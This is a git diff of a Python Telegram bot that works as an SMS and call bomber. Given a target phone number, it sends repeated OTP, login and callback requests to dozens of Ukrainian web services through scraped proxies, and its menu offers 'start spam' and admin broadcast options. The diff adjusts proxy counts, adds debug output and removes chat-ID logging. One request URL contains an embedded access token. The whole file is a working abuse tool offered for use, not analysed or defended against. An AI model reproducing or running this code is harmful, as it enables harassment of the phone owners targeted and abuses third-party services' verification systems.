@@ -108,19 +108,20 @@ def send_for_number_https(aa):
     uniq_number_minus = f'+{aa[:2]}-({aa[2:5]})-{aa[5:8]}-{aa[8:10]}-{aa[10:12]}'
     number_plus = '+' + aa
 
-
+    CRED = '\033[91m'
+    CEND = '\033[0m'
     no_valid_proxy = []
     valid_proxy = []
-    parser_https.run(no_valid_proxy,valid_proxy,6)
+    parser_https.run(no_valid_proxy,valid_proxy,1)
     coun = 0
     try:
         proxies = {
             'http': f'http://{valid_proxy[coun]}',
             'https': f'http://{valid_proxy[coun]}'
         }
-        print(valid_proxy[coun])
-        requests.post('https://ucb.z.apteka24.ua/api/send/otp',headers=headers,proxies=proxies, json={"phone": aa})
-        d = requests.post('https://helsi.me/api/healthy/v2/accounts/login', headers=headers,proxies=proxies, json={'phone':aa,'platform':'PISWeb'})
+        print(valid_proxy[coun])  
+        d = requests.post('https://ucb.z.apteka24.ua/api/send/otp',headers=headers,proxies=proxies, json={"phone": aa})   
+        d = requests.post('https://helsi.me/api/healthy/v2/accounts/login', headers=headers,proxies=proxies, json={'phone':aa,'platform':'PISWeb'})     
         requests.post('https://city-drive.phonet.com.ua/rest/public/widget/call-catchers/15bdee1b-7e69-4a97-b04b-8d96708fe5b5/call?timestamp=166280969timeout=1.5,49&utcOffset=-180',headers=headers,proxies=proxies, json={
         "phone": number_plus,
         "utm": {
@@ -134,10 +135,9 @@ def send_for_number_https(aa):
         "telerSessionId": "1d6cfee7-0292-4cab-b3fa-b74d66a45940",
         "uaId": "UA-21322812-1",
         "clientId": "1008992044.1662752535",
-        "pageUrl": "https://city-drive.ua/user/register"})
+        "pageUrl": "https://city-drive.ua/user/register"}) 
         d = requests.post('https://api.staff-clothes.com/api/v1/send-sms-code?access_token=MDFiNjdiNGFhZjU4ZDU0YzVkMjQ4NDMxYTI5YWM0Y2QzZjQzNjJhYjI4ZjY1ODJlOTZjN2QxMmQxNjM2OTMyNQ&locale=ua&action=register_new_user',headers=headers,proxies=proxies, data={'mobileNumber':aa})
-        d = requests.post('https://iq-pizza.eatery.club/site/v1/pre-login', headers=headers, proxies=proxies,
-                          data={'phone': aa})
+        d = requests.post('https://iq-pizza.eatery.club/site/v1/pre-login', headers=headers, proxies=proxies,data={'phone': aa})
         d = requests.post('https://www.tarantino-family.com/wp-admin/admin-ajax.php', headers=headers, proxies=proxies, data={'phone':aa})
         d = requests.post('https://vilki-palki.od.ua/api/secret/generate?lang=russian', headers=headers,proxies=proxies, data={'phone': uniq_number})
         d = requests.post('https://kasta.ua/api/v2/ssr/login-form', headers=headers,proxies=proxies, data={'email': number_plus})
@@ -278,6 +278,7 @@ def send_for_number_https(aa):
         coun+=1
         print(f'Круг {coun}')
     except:
+        print(d.text)
         coun+=1
     print('все')
 
@@ -509,7 +510,6 @@ def handle_message_received(message):
         name = message.from_user.first_name
     
         if text == '🤖Інформація':
-            save_chat_id(chat_id)
             bot.send_message(chat_id,'''
 В спальні під ліжком жив собі павук -
 В чорний горошок, мав аж вісім рук.
@@ -567,35 +567,28 @@ def handle_message_received(message):
     
 
         elif text == '☎️Запуск спама':
-            save_chat_id(chat_id)
             bot.send_message(chat_id, '<b>Введи номер без + в форматі:\n🇺🇦 380xxxxxxxxx seconds +/-\n</b>\nПриклад: 380xxxxxxxxx 50 +', parse_mode='HTML')
 
         elif text == '📈Статистика':
-            save_chat_id(chat_id)
             bot.send_message(chat_id, f'📊Статистика відображається в реальному часі!\nКористувачів🙎‍♂: {users_amount[0]}<b>\nВ боті 69 сервісів</b>', parse_mode='HTML')
 
         elif text == '🔥Розсилка' and chat_id==ADMIN_CHAT_ID:
-            save_chat_id(chat_id)
             bot.send_message(chat_id, 'Введи повідомлення в форматі: "РОЗІСЛАТИ: ваш_текст"')
 
         elif text == '❗️ FAQ':
-            save_chat_id(chat_id)
             bot.send_message(chat_id, 'Ви автоматом берете відповідальність за користування цим ботом. Ми не несем відповідальності за ваші дії, тільки тест! дякую за увагу.')
 
         elif text == '❌Зупинити спам':
-            save_chat_id(chat_id)
             if chat_id not in running_spams_per_chat_id:
                 bot.send_message(chat_id, 'Спам ще не починався')
             else:
                 running_spams_per_chat_id.remove(chat_id)
 
         elif 'РОЗІСЛАТИ: ' in text and chat_id==ADMIN_CHAT_ID:
-            save_chat_id(chat_id)
             msg = text.replace("РОЗІСЛАТИ: ","")
             send_message_users(msg)
         
         elif len(text) >= 12 <= 19:
-            save_chat_id(chat_id)
             if '380' in text:
                 sec = message.text.split()[1]
                 prox = message.text.split()[2]
